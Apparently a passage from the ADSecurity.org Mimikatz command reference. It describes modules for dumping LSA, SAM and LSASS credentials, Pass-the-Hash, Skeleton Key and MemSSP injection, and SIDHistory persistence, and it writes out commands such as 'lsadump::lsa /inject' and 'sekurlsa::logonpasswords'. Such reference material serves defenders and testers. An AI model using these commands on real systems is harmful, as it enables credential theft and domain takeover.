<p>Command:  mimikatz lsadump::lsa /inject exit</p>
<p>Dumps credential data in an Active Directory domain when run on a Domain Controller.<br />
Requires administrator access (with debug rights) or Local SYSTEM rights</p>
<p>The account with RID 502 is the KRBTGT account and the account with RID 500 is the default administrator for the domain.</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-LSA.png"><img class="alignnone size-full wp-image-1823" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-LSA.png" alt="Mimikatz-LSADump-LSA" width="413" height="595" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-LSA-208x300.png 208w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-LSA.png 413w" sizes="(max-width: 413px) 100vw, 413px" /></a></p>
<p>Here&#8217;s the result when running LSADUMP::lsa /patch which only dumps the NTLM password hashes.</p>
<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/InvokeMimikatz-DumpADdb-KRBTGT3.png"><img style="background-image: none; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-width: 0px;" title="InvokeMimikatz-DumpADdb-KRBTGT" src="http://adsecurity.org/wp-content/uploads/2015/01/InvokeMimikatz-DumpADdb-KRBTGT_thumb3.png" alt="InvokeMimikatz-DumpADdb-KRBTGT" width="580" height="653" border="0" /></a></p>
<p>&nbsp;</p>
<p><b><b>LSADUMP::Rpdata</b></b></p>
<p><a id="LSADUMPSAM"></a><b>LSADUMP::SAM</b> &#8211; get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts.<br />
<em>Requires System or Debug rights.</em><br />
It contains NTLM, and sometimes LM hash, of users passwords. It can work in two modes: online (with SYSTEM user or token) or offline (with SYSTEM &amp; SAM hives or backup).</p>
<p>Requires administrator access (with debug rights) or Local SYSTEM rights when run against an online SAM.</p>
<p><em>Getting an impersonated SYSTEM token: Mimikatz &#8220;PRIVILEGE::Debug&#8221; &#8220;TOKEN:elevate&#8221;<br />
</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-SAM.png"><img class="alignnone size-full wp-image-1824" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-SAM.png" alt="Mimikatz-LSADump-SAM" width="378" height="202" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-SAM-300x160.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-SAM.png 378w" sizes="(max-width: 378px) 100vw, 378px" /></a></p>
<p><b>LSADUMP::Secrets</b> &#8211; get the SysKey to decrypt SECRETS entries (from registry or hives).<br />
<em>Requires System or Debug rights.</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Secrets.png"><img class="alignnone size-full wp-image-1825" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Secrets.png" alt="Mimikatz-LSADump-Secrets" width="841" height="463" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Secrets-300x165.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Secrets.png 841w" sizes="(max-width: 841px) 100vw, 841px" /></a></p>
<p><a id="LSADUMPTrust"></a><a href="https://adsecurity.org/?p=1588"><b>LSADUMP::Trust</b></a> &#8211; Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly).<br />
<em>Requires System or Debug rights.</em></p>
<p>Extracts data from Active Directory for existing trust relationships for the domain. The trust key (password) is displayed as well.</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Trust.png"><img class="alignnone size-full wp-image-1826" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Trust.png" alt="Mimikatz-LSADump-Trust" width="844" height="640" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Trust-300x227.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Trust.png 844w" sizes="(max-width: 844px) 100vw, 844px" /></a></p>
<p>&nbsp;</p>
<h4><b><a id="MISC"></a>MISC</b></h4>
<p>The MISC Mimikatz module is kind of a catch-all for commands that don&#8217;t quite fit elsewhere.<br />
The most well known commands in this module are MISC::AddSID, MISC::MemSSP, and MISC::Skeleton.</p>
<p><a id="MISCAddSid"></a><a href="https://adsecurity.org/?p=1772"><b>MISC::AddSid</b></a> &#8211; Add to SIDHistory to user account. The first value is the target account and the second value is the account/group name(s) (or SID).<br />
<em>Requires System or Debug rights.</em><br />
<a href="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-AddSIDHistory-BobaFett-ADSADministrator1.png"><img class="alignnone size-full wp-image-1898" src="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-AddSIDHistory-BobaFett-ADSADministrator1.png" alt="SneakyPersistence-AddSIDHistory-BobaFett-ADSADministrator" width="661" height="204" srcset="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-AddSIDHistory-BobaFett-ADSADministrator1-300x93.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-AddSIDHistory-BobaFett-ADSADministrator1.png 661w" sizes="(max-width: 661px) 100vw, 661px" /></a><a href="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-AddSIDHistory-GetUSerInfo-BobaFett1.png"><img class="alignnone size-full wp-image-1897" src="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-AddSIDHistory-GetUSerInfo-BobaFett1.png" alt="SneakyPersistence-AddSIDHistory-GetUSerInfo-BobaFett" width="517" height="192" srcset="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-AddSIDHistory-GetUSerInfo-BobaFett1-300x111.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-AddSIDHistory-GetUSerInfo-BobaFett1.png 517w" sizes="(max-width: 517px) 100vw, 517px" /></a></p>
<p><b>MISC::Cmd</b> &#8211; Command Prompt (without DisableCMD).<br />
<em>Requires Administrator rights.</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-CMD.png"><img class="alignnone size-full wp-image-1827" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-CMD.png" alt="Mimikatz-Misc-CMD" width="676" height="394" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-CMD-300x175.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-CMD.png 676w" sizes="(max-width: 676px) 100vw, 676px" /></a></p>
<p><b>MISC::Detours</b> &#8211; (<em><strong>experimental</strong></em>) Try to enumerate all modules with Detours-like hooks<br />
<em>Requires Administrator rights.</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Detours.png"><img class="alignnone size-full wp-image-1828" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Detours.png" alt="Mimikatz-Misc-Detours" width="538" height="512" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Detours-300x286.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Detours.png 538w" sizes="(max-width: 538px) 100vw, 538px" /></a></p>
<p><a id="MISCMemSSP"></a><b>MISC::MemSSP</b> &#8211; Inject a malicious Windows SSP to log locally authenticated credentials by patching LSASS in memory with new SSP &#8211; no reboot required (rebooting clears the memssp Mimikatz injects). This <a href="https://adsecurity.org/?p=1760">post on Mimikatz SSP describes in-memory patching as well as more persistent SSP techniques</a>.<br />
Requires Administrator rights.<a href="https://dl.mandiant.com/EE/library/MIRcon2014/MIRcon_2014_IR_Track_Analysis_of_Malicious_SSP.pdf"><br />
</a><a href="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-EnableMimiSSP-MemSSP-011.png"><img class="alignnone size-full wp-image-1899" src="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-EnableMimiSSP-MemSSP-011.png" alt="SneakyPersistence-EnableMimiSSP-MemSSP-01" width="639" height="191" srcset="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-EnableMimiSSP-MemSSP-011-300x90.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-EnableMimiSSP-MemSSP-011.png 639w" sizes="(max-width: 639px) 100vw, 639px" /></a><a href="https://dl.mandiant.com/EE/library/MIRcon2014/MIRcon_2014_IR_Track_Analysis_of_Malicious_SSP.pdf"><br />
</a><a href="https://dl.mandiant.com/EE/library/MIRcon2014/MIRcon_2014_IR_Track_Analysis_of_Malicious_SSP.pdf">Mandiant presentation on MemSSP</a></p>
<p>&nbsp;</p>
<p><b>MISC::Ncroutemon</b> &#8211; Juniper Manager (without DisableTaskMgr)</p>
<p><b>MISC::Regedit</b> &#8211; Registry Editor (without DisableRegistryTools)<br />
<em>Requires Administrator rights.</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Regedit.jpg" rel="attachment wp-att-2162"><img class="alignnone wp-image-2162" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Regedit.jpg" alt="Mimikatz-Misc-Regedit" width="642" height="209" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Regedit-300x98.jpg 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Regedit-768x250.jpg 768w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Regedit-1024x333.jpg 1024w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Regedit.jpg 1288w" sizes="(max-width: 642px) 100vw, 642px" /></a></p>
<p><a id="MISCSkeleton"></a><a href="https://adsecurity.org/?p=1275"><b>MISC::Skeleton</b></a> &#8211; Inject Skeleton Key into LSASS process on Domain Controller.<br />
<em>Requires Administrator rights.</em><br />
This enables all user authentication to the Skeleton Key patched DC to use a &#8220;master password&#8221; (aka Skeleton Keys) as well as their usual password.<br />
<a href="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-EnableMimikatzSkeleton.png"><img class="alignnone size-full wp-image-1900" src="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-EnableMimikatzSkeleton.png" alt="SneakyPersistence-EnableMimikatzSkeleton" width="642" height="283" srcset="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-EnableMimikatzSkeleton-300x132.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-EnableMimikatzSkeleton.png 642w" sizes="(max-width: 642px) 100vw, 642px" /></a></p>
<p><b>MISC::Taskmgr</b> &#8211; Task Manager (without DisableTaskMgr).<br />
<em>Requires Administrator rights.</em><br />
<a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Taskmgr.jpg"><img class="alignnone wp-image-1901" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Taskmgr.jpg" alt="Mimikatz-Misc-Taskmgr" width="516" height="409" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Taskmgr-300x238.jpg 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-Taskmgr.jpg 619w" sizes="(max-width: 516px) 100vw, 516px" /></a></p>
<p><b>MISC::Wifi</b></p>
<p>&nbsp;</p>
<h4><b><a id="MINESWEEPER"></a>MINESWEEPER</b></h4>
<p><b>MINESWEEPER::Infos</b> &#8211; Provide mine info in minesweeper</p>
<p>&nbsp;</p>
<h4><b><a id="Net"></a>Net</b></h4>
<p><b>NET::User</b></p>
<p><b>NET::Group</b></p>
<p><b>NET::LocalGroup</b></p>
<p>&nbsp;</p>
<h4><b><a id="PRIVILEGE"></a>PRIVILEGE</b></h4>
<p><a id="PRIVILEGEDebug"></a><b>PRIVILEGE::Debug</b> &#8211; get debug rights (this or Local System rights is required for many Mimikatz commands).<br />
By default, the Administrators group has Debug rights. Debug still has to be &#8220;activated&#8221; by running &#8220;privilege::debug&#8221;.</p>
<p><em>The debug privilege allows someone to debug a process that they wouldn’t otherwise have access to. For example, a process running as a user with the debug privilege enabled on its token can debug a service running as local system.</em><br />
<em><a href="http://msdn.microsoft.com/library/windows/hardware/ff541528.aspx">http://msdn.microsoft.com/library/windows/hardware/ff541528.aspx</a></em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Privilege-Debug.png"><img class="alignnone wp-image-1829" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Privilege-Debug.png" alt="Mimikatz-Privilege-Debug" width="260" height="47" /></a></p>
<p><span style="text-decoration: underline;">Benjamin&#8217;s Remark:</span><br />
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061 means that the required privilege is not held by the client (mostly you&#8217;re not an administrator :smirk:)</p>
<p>&nbsp;</p>
<h4><b><a id="PROCESS"></a>PROCESS</b></h4>
<p>The Mimikatz PROCESS module provides the ability to gather data on processes and interact with processes.</p>
<p><b>PROCESS::Exports</b> &#8211; list exports</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Exports.jpg" rel="attachment wp-att-2167"><img class="alignnone wp-image-2167" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Exports.jpg" alt="Mimikatz-Process-Exports" width="541" height="653" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Exports-768x926.jpg 768w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Exports-849x1024.jpg 849w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Exports.jpg 1381w" sizes="(max-width: 541px) 100vw, 541px" /></a></p>
<p><b>PROCESS::Imports</b> &#8211; list imports</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Imports.jpg" rel="attachment wp-att-2170"><img class="alignnone wp-image-2170" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Imports.jpg" alt="Mimikatz-Process-Imports" width="417" height="599" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Imports-209x300.jpg 209w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Imports-768x1104.jpg 768w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Imports-712x1024.jpg 712w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Imports.jpg 1163w" sizes="(max-width: 417px) 100vw, 417px" /></a></p>
<p>&nbsp;</p>
<p><b>PROCESS::List</b> &#8211; List running processes<br />
Requires Administrator rights.</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-List.jpg" rel="attachment wp-att-2169"><img class="alignnone wp-image-2169" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-List.jpg" alt="Mimikatz-Process-List" width="292" height="590" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-List-507x1024.jpg 507w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-List.jpg 638w" sizes="(max-width: 292px) 100vw, 292px" /></a></p>
<p><b>PROCESS::Resume</b> &#8211; resume a process</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Resume.jpg" rel="attachment wp-att-2171"><img class="alignnone wp-image-2171" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Resume.jpg" alt="Mimikatz-Process-Resume" width="267" height="37" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Resume-300x42.jpg 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Resume.jpg 469w" sizes="(max-width: 267px) 100vw, 267px" /></a></p>
<p><b>PROCESS::Start</b> &#8211; start a process</p>
<p><b>PROCESS::Stop</b> &#8211; terminate a process</p>
<p><b>PROCESS::Suspend</b> &#8211; suspend a process</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Suspend.jpg" rel="attachment wp-att-2172"><img class="alignnone wp-image-2172" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Suspend.jpg" alt="Mimikatz-Process-Suspend" width="289" height="35" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Suspend-300x36.jpg 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Process-Suspend.jpg 495w" sizes="(max-width: 289px) 100vw, 289px" /></a></p>
<p>&nbsp;</p>
<h4><b><a id="SEKURLSA"></a>SEKURLSA</b></h4>
<p>The SEKURLSA Mimikatz module interacts with protected memory. This module extracts passwords, keys, pin codes, tickets from the memory of lsass (Local Security Authority Subsystem Service).<br />
In order to interact with LSASS, the Mimikatz process requires appropriate rights:</p>
<ul>
<li>Administrator, to get debug privilege via <em>&#8220;PRIVILEGE::Debug&#8221; </em></li>
<li>SYSTEM rights (<em>&#8220;TOKEN::elevate&#8221;)</em></li>
</ul>
<p>However, running against a dumped LSASS process file (i.e. LSASS.dmp), elevated rights are not required.</p>
<p>&nbsp;</p>
<p><b>SEKURLSA::Backupkeys</b> &#8211; get preferred backup master keys</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-sekurlsa-Backupkeys.jpg" rel="attachment wp-att-2173"><img class="alignnone wp-image-2173" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-sekurlsa-Backupkeys.jpg" alt="Mimikatz-sekurlsa-Backupkeys" width="394" height="75" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-sekurlsa-Backupkeys-300x57.jpg 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-sekurlsa-Backupkeys-768x146.jpg 768w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-sekurlsa-Backupkeys.jpg 850w" sizes="(max-width: 394px) 100vw, 394px" /></a></p>
<p><b>SEKURLSA::Credman</b> &#8211; List Credentials Manager</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Credman.png"><img class="alignnone size-full wp-image-1830" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Credman.png" alt="Mimikatz-Sekurlsa-Credman" width="474" height="560" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Credman-254x300.png 254w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Credman.png 474w" sizes="(max-width: 474px) 100vw, 474px" /></a></p>
<p><b>SEKURLSA::Dpapi</b> &#8211; list cached MasterKeys</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-DPAPI.png"><img class="alignnone size-full wp-image-1831" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-DPAPI.png" alt="Mimikatz-Sekurlsa-DPAPI" width="478" height="554" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-DPAPI-259x300.png 259w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-DPAPI.png 478w" sizes="(max-width: 478px) 100vw, 478px" /></a></p>
<p><b>SEKURLSA::DpapiSystem</b> &#8211; DPAPI_SYSTEM secret</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-DPAPISystem.png"><img class="alignnone size-full wp-image-1832" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-DPAPISystem.png" alt="Mimikatz-Sekurlsa-DPAPISystem" width="631" height="57" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-DPAPISystem-300x27.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-DPAPISystem.png 631w" sizes="(max-width: 631px) 100vw, 631px" /></a></p>
<p><a id="SEKURLSAEkeys"></a><b>SEKURLSA::Ekeys</b> &#8211; list Kerberos encryption keys</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-EKeys.png"><img class="alignnone size-full wp-image-1833" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-EKeys.png" alt="Mimikatz-Sekurlsa-EKeys" width="752" height="677" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-EKeys-300x270.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-EKeys.png 752w" sizes="(max-width: 752px) 100vw, 752px" /></a></p>
<p><a id="SEKURLSAKerberos"></a><b>SEKURLSA::Kerberos</b> &#8211; List Kerberos credentials for all authenticated users (including services and computer account)</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Kerberos.png"><img class="alignnone size-full wp-image-1834" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Kerberos.png" alt="Mimikatz-Sekurlsa-Kerberos" width="751" height="611" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Kerberos-300x244.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Kerberos.png 751w" sizes="(max-width: 751px) 100vw, 751px" /></a></p>
<p><a id="SEKURLSAKrbtgt"></a><b>SEKURLSA::Krbtgt</b> &#8211; get Domain Kerberos service account (KRBTGT)password data</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-KrbTGT.png"><img class="alignnone size-full wp-image-1835" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-KrbTGT.png" alt="Mimikatz-Sekurlsa-KrbTGT" width="669" height="119" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-KrbTGT-300x53.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-KrbTGT.png 669w" sizes="(max-width: 669px) 100vw, 669px" /></a></p>
<p><b>SEKURLSA::LiveSSP</b> &#8211; Lists LiveSSP credentials</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-LiveSSP.png"><img class="alignnone size-full wp-image-1836" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-LiveSSP.png" alt="Mimikatz-Sekurlsa-LiveSSP" width="477" height="657" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-LiveSSP-218x300.png 218w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-LiveSSP.png 477w" sizes="(max-width: 477px) 100vw, 477px" /></a></p>
<p><a id="SEKURLSALogonPasswords"></a><b>SEKURLSA::LogonPasswords</b> &#8211; lists all available provider credentials. This usually shows recently logged on user and computer credentials.</p>
<ul>
<li>Dumps password data in LSASS for currently logged on (or recently logged on) accounts as well as services running under the context of user credentials.</li>
<li>Account passwords are stored in memory in a reversible manner. If they are in memory (prior to Windows 8.1/Windows Server 2012 R2 they were), they are displayed. Windows 8.1/Windows Server 2012 R2 doesn’t store the account password in this manner in most cases. KB2871997 &#8220;back-ports&#8221; this security capability to  Windows 7, Windows 8, Windows Server 2008R2, and Windows Server 2012, though the computer needs additional configuration after applying KB2871997.</li>
<li>Requires administrator access (with debug rights) or Local SYSTEM rights</li>
</ul>
<p><span style="font-family: times new roman;"><strong style="font-size: medium;">Windows Server 2008 R2 System (Password is shown).</strong>                                                 </span></p>
<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win10.png"><span style="font-family: times new roman;"><img style="background-image: none; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-width: 0px;" title="Mimikatz-Sekurlsa-logonpasswords-Win2008R2-Part1" src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win10_thumb.png" alt="Mimikatz-Sekurlsa-logonpasswords-Win2008R2-Part1" width="572" height="851" border="0" /></span></a><span style="font-family: times new roman;">  </span></p>
<p><strong><span style="font-family: times new roman;">Windows Server 2012 R2 system – no cleartext password shown</span></strong></p>
<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win2012R21.png"><span style="font-family: times new roman;"><img class="" style="background-image: none; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-width: 0px;" title="Mimikatz-Sekurlsa-logonpasswords-Win2012R2" src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win2012R2_thumb1.png" alt="Mimikatz-Sekurlsa-logonpasswords-Win2012R2" width="569" height="692" border="0" /></span></a></p>
<p><span style="font-family: times new roman;">Services running with account credentials are also dumped using this command.<br />
Note that only services that are running (credentials in memory) can be dumped in this manner.<br />
</span></p>
<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/WindowsServer2008R2-SQLServices.png"><span style="font-family: times new roman;"><img style="background-image: none; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-width: 0px;" title="WindowsServer2008R2-SQLServices" src="http://adsecurity.org/wp-content/uploads/2015/01/WindowsServer2008R2-SQLServices_thumb.png" alt="WindowsServer2008R2-SQLServices" width="848" height="296" border="0" /></span></a></p>
<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win2008R2-ServicePasswordDump-Part22.png"><span style="font-family: times new roman;"><img class="" style="background-image: none; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-width: 0px;" title="Mimikatz-Sekurlsa-logonpasswords-Win2008R2-ServicePasswordDump-Part2" src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win2008R2-ServicePasswordDump-Part2_thumb2.png" alt="Mimikatz-Sekurlsa-logonpasswords-Win2008R2-ServicePasswordDump-Part2" width="515" height="298" border="0" /></span></a></p>
<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win2008R2-ServicePasswordDump-Part32.png"><span style="font-family: times new roman;"><img class="" style="background-image: none; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-width: 0px;" title="Mimikatz-Sekurlsa-logonpasswords-Win2008R2-ServicePasswordDump-Part3" src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win2008R2-ServicePasswordDump-Part3_thumb2.png" alt="Mimikatz-Sekurlsa-logonpasswords-Win2008R2-ServicePasswordDump-Part3" width="519" height="295" border="0" /></span></a></p>
<p>&nbsp;</p>
<p><b>SEKURLSA::Minidump</b> &#8211; switch to LSASS minidump process context</p>
<p>Note that Minidumps need to be read using the same platform it was dumped from NT5 Win32 or NT5x64 or NT6 Win32 or NT6 x64.<br />
<a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Minidump.png"><img class="alignnone wp-image-1838" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Minidump.png" alt="Mimikatz-Sekurlsa-Minidump" width="449" height="207" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Minidump-300x138.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Minidump.png 829w" sizes="(max-width: 449px) 100vw, 449px" /></a></p>
<p><b>SEKURLSA::MSV</b> &#8211; List LM &amp; NTLM credentials</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-MSV.png"><img class="alignnone size-full wp-image-1839" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-MSV.png" alt="Mimikatz-Sekurlsa-MSV" width="473" height="674" /></a></p>
<p><b>SEKURLSA::Process</b> &#8211; switch to LSASS process context</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Process.png"><img class="alignnone wp-image-1840" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Process.png" alt="Mimikatz-Sekurlsa-Process" width="273" height="36" /></a></p>
<p><a id="SEKURLSAPth"></a><b>SEKURLSA::Pth</b> &#8211; Pass-the-Hash and Over-Pass-the-Hash (aka pass the key).</p>
<p><em>Mimikatz can perform the well-known operation &#8216;Pass-The-Hash&#8217; to run a process under another credentials with NTLM hash of the user&#8217;s password, instead of its real password. For this, it starts a process with a fake identity, then replaces fake information (NTLM hash of the fake password) with real information (NTLM hash of the real password).</em></p>
<ul>
<li>/user &#8211; the username you want to impersonate, keep in mind that Administrator is not the only name for this well-known account.</li>
<li>/domain &#8211; the fully qualified domain name &#8211; without domain or in case of local user/admin, use computer or server name, workgroup or whatever.</li>
<li>/rc4 or /ntlm &#8211; optional &#8211; the RC4 key / NTLM hash of the user&#8217;s password.</li>
<li>/run &#8211; optional &#8211; the command line to run &#8211; default is: cmd to have a shell.</li>
</ul>
